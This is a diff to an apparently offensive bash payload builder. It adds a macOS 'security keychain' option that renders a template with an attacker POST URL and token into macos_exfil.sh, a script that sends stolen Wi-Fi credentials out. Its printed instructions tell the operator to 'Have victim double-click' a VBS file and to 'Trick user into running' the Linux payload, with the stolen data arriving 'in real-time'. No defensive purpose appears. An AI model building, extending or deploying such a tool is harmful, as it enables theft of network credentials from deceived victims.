@@ -202,13 +202,15 @@ echo
 echo -e "${CYAN}🎯 SELECT TARGET OPERATING SYSTEM${NC}"
 echo -e "   [${GREEN}1${NC}] Windows (netsh-based)"
 echo -e "   [${GREEN}2${NC}] Linux (nmcli-based)"
+echo -e "   [${GREEN}3${NC}] macOS (security keychain)"
 echo
 while true; do
-    read -p "Enter your choice (1-2): " target_choice
+    read -p "Enter your choice (1-3): " target_choice
     case $target_choice in
         1) TARGET_OS="windows"; break ;;
         2) TARGET_OS="linux"; break ;;
-        *) echo -e "${RED}Invalid option. Please enter 1 or 2.${NC}";;
+        3) TARGET_OS="macos"; break ;;
+        *) echo -e "${RED}Invalid option. Please enter 1-3.${NC}";;
     esac
 done
 
@@ -320,7 +322,7 @@ EOF
     echo -e "   2. Have victim double-click 'run.vbs'"
     echo -e "   3. Wi-Fi data will appear here in real-time\n"
 
-else
+elif [ "$TARGET_OS" = "linux" ]; then
     # --- Linux Payload ---
     SH_OUT="$PAYLOADS_DIR/linux_exfil.sh"
 
@@ -335,6 +337,23 @@ else
     echo -e "\n${LIME}💡 Instructions:${NC}"
     echo -e "   1. Copy 'linux_exfil.sh' to target USB drive"
     echo -e "   2. Trick user into running './linux_exfil.sh'"
+    echo -e "   3. Wi-Fi data will appear here in real-time\n"
+
+elif [ "$TARGET_OS" = "macos" ]; then
+    # --- macOS Payload ---
+    SH_OUT="$PAYLOADS_DIR/macos_exfil.sh"
+
+    # Render macOS script
+    sed "s|{{POST_URL}}|$POST_URL|g; s|{{TOKEN}}|$EXFIL_TOKEN|g" "$TEMPLATES_DIR/macos.sh.tpl" > "$SH_OUT"
+    chmod +x "$SH_OUT"
+
+    echo -e "\n${GREEN}🎉 MACOS PAYLOADS GENERATED${NC}"
+    echo -e "${YELLOW}📁 Location:${NC} $PAYLOADS_DIR/"
+    echo -e "${CYAN}📄 Files:${NC}"
+    echo -e "   └── ${GREEN}macos_exfil.sh${NC} (Bash payload)"
+    echo -e "\n${LIME}💡 Instructions:${NC}"
+    echo -e "   1. Copy 'macos_exfil.sh' to target machine"
+    echo -e "   2. Run with: chmod +x macos_exfil.sh && ./macos_exfil.sh"
     echo -e "   3. Wi-Fi data will appear here in real-time\n"
 fi
 
